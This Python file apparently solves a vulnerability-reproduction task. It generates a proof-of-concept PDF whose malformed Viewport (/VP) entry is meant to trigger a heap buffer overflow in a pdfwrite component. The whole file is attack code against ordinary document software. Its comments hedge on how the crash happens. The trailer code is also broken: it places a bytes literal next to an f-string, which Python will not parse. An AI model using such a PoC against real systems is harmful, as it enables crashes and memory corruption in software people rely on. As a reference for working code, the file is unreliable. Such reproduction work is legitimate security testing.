import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in pdfwrite.
        The vulnerability occurs when pdfwrite attempts to restore the viewer state (pop from stack)
        without ensuring the viewer depth is at least 1. This can be triggered by a malformed
        Viewport (VP) entry in a PDF, where the push operation fails or is skipped, but the
        cleanup logic unconditionally attempts to restore state.
        """
        
        # PDF Header for version 2.0 (PDF 2.0 introduced Viewports)
        pdf_header = b"%PDF-2.0\n"
        
        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages Tree
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page with malformed VP
        # The /VP array contains a dictionary that is missing the required /BBox entry.
        # This causes the 'push' operation to potentially fail or not increment the depth,
        # while the 'pop' operation at the end of the page (or error path) decrements it,
        # causing an underflow/heap overflow.
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R "
            b"/MediaBox [0 0 612 792] "
            b"/VP [ << /Type /Viewport >> ] "
            b"/Resources << >> >>\n"
            b"endobj\n"
        )
        
        objects = [pdf_header, obj1, obj2, obj3]
        
        # Calculate offsets for the Cross-Reference Table
        offsets = []
        current_pos = 0
        for obj in objects:
            if obj.startswith(b"%"):
                current_pos += len(obj)
                continue
            offsets.append(current_pos)
            current_pos += len(obj)
            
        # Construct XRef Table
        xref_entries = []
        # Entry 0: Free object
        xref_entries.append(b"0000000000 65535 f \n")
        # Entries 1-3: Used objects
        for offset in offsets:
            xref_entries.append(f"{offset:010d} 00000 n \n".encode('ascii'))
            
        xref_body = b"".join(xref_entries)
        xref_section = f"xref\n0 {len(xref_entries)}\n".encode('ascii') + xref_body
        
        # Trailer
        trailer = (
            b"trailer\n"
            b"<< /Size " + str(len(xref_entries)).encode('ascii') + b" /Root 1 0 R >>\n"
            b"startxref\n"
            f"{current_pos}\n".encode('ascii')
            b"%%EOF\n"
        )
        
        return b"".join(objects) + xref_section + trailer